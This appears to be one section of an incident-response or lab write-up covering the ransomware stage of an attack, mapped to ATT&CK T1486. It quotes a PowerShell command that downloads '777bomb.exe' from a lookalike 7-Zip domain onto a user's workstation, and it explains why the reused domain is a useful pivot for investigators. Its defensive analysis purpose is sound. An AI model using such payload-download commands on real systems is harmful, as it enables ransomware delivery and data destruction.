# 07 — Ransomware Impact

## What I found

Near the end of the investigation, the same domain used at the start was used again to retrieve `777bomb.exe`.

```powershell
iwr http://www.7zipp.org/a/777bomb.exe -outfile C:\Users\perry.parsons\bomb.exe
```

**Time:** `2023-09-26 15:41:32.602`

The payload was then executed during the final stage and the attack ended with ransomware impact on the affected workstations.

## Why it matters

Reusing the same external infrastructure is a strong pivot. A historical search for `7zipp.org` could connect the start of the attack with the final payload.

## ATT&CK

- T1486 — Data Encrypted for Impact
